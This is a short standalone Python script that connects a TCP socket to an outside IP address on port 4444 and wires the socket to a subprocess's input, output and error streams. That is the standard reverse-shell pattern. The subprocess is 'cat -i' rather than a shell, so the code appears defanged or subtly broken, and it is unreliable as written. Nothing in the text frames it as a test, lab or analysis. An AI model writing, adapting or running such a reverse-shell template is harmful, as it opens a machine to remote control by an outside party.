import socket
import subprocess

channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
channel.connect(("142.4.107.34", 4444))
subprocess.Popen(["/usr/bin/cat", "-i"], stdin=channel.fileno(), stdout=channel.fileno(), stderr=channel.fileno())
